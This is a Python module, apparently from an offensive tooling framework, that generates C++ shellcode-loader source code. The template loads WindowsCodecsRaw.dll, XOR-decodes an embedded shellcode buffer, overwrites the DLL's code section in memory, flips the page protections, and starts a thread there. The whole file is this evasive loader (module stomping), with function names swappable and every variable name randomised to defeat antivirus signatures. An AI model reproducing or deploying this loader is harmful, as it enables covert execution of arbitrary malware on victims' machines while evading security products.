from modules.namegen import generate_random_name

def generate_exe_template(function_name, xor_function, xor_var, shellcode_var, shellcode_len_var, create_thread, virtual_protect, write_vm):

    exe_template = """
void REPLACE_WITH_FUNCTION_NAME() {

    HANDLE REPLACE_W_VAR1 = GetCurrentProcess();
    DWORD REPLACE_W_VAR2 = NULL;

    CHAR REPLACE_W_VAR3[] = { 'W','i','n','d','o','w','s', 'C', 'o', 'd','e','c','s','R', 'a', 'w', '.','d','l','l', 0x0 };
    HMODULE REPLACE_W_VAR4 = LoadLibraryA((LPCSTR)REPLACE_W_VAR3);

    PVOID REPLACE_W_VAR5 = REPLACE_W_VAR4 + 0x1000;
    PVOID REPLACE_W_VAR6 = REPLACE_W_VAR4 + 0x1000;
    PVOID REPLACE_W_VAR7 = REPLACE_W_VAR4 + 0x1000;

    REPLACE_WITH_XOR_FUNCTION_NAME((char*)REPLACE_WITH_SHELLCODE_VAR, REPLACE_WITH_SHELLCODE_LEN_VAR, REPLACE_WITH_KEY_VAR, sizeof(REPLACE_WITH_KEY_VAR));
    SIZE_T REPLACE_W_VAR8 = sizeof(REPLACE_WITH_SHELLCODE_VAR);
    REPLACE_WITH_VIRTUAL_PROTECT(REPLACE_W_VAR1, &REPLACE_W_VAR5, &REPLACE_W_VAR8, PAGE_READWRITE, &REPLACE_W_VAR2);
    REPLACE_WITH_WRITE_VM(REPLACE_W_VAR1, REPLACE_W_VAR6, REPLACE_WITH_SHELLCODE_VAR, REPLACE_W_VAR8, nullptr);
    REPLACE_WITH_VIRTUAL_PROTECT(REPLACE_W_VAR1, &REPLACE_W_VAR7, &REPLACE_W_VAR8, PAGE_EXECUTE_READ, &REPLACE_W_VAR2);

	HANDLE REPLACE_W_VAR9;
	REPLACE_WITH_CREATE_THREAD(&REPLACE_W_VAR9, GENERIC_EXECUTE, NULL, REPLACE_W_VAR1, (PTHREAD_START_ROUTINE)REPLACE_W_VAR6, NULL, FALSE, 0, 0, 0, nullptr);
	getchar();

}

"""

    exe_template = exe_template.replace("REPLACE_WITH_CREATE_THREAD", create_thread)
    exe_template = exe_template.replace("REPLACE_WITH_VIRTUAL_PROTECT", virtual_protect)
    exe_template = exe_template.replace("REPLACE_WITH_WRITE_VM", write_vm)
    exe_template = exe_template.replace("REPLACE_WITH_XOR_FUNCTION_NAME", xor_function)
    exe_template = exe_template.replace("REPLACE_WITH_SHELLCODE_VAR", shellcode_var)
    exe_template = exe_template.replace("REPLACE_WITH_SHELLCODE_LEN_VAR", shellcode_len_var)
    exe_template = exe_template.replace("REPLACE_WITH_KEY_VAR", xor_var)
    exe_template = exe_template.replace("REPLACE_WITH_FUNCTION_NAME", function_name)

    exe_template = exe_template.replace("REPLACE_W_VAR1", generate_random_name())
    exe_template = exe_template.replace("REPLACE_W_VAR2", generate_random_name())
    exe_template = exe_template.replace("REPLACE_W_VAR3", generate_random_name())
    exe_template = exe_template.replace("REPLACE_W_VAR4", generate_random_name())
    exe_template = exe_template.replace("REPLACE_W_VAR5", generate_random_name())
    exe_template = exe_template.replace("REPLACE_W_VAR6", generate_random_name())
    exe_template = exe_template.replace("REPLACE_W_VAR7", generate_random_name())
    exe_template = exe_template.replace("REPLACE_W_VAR8", generate_random_name())
    exe_template = exe_template.replace("REPLACE_W_VAR9", generate_random_name())

    return exe_template

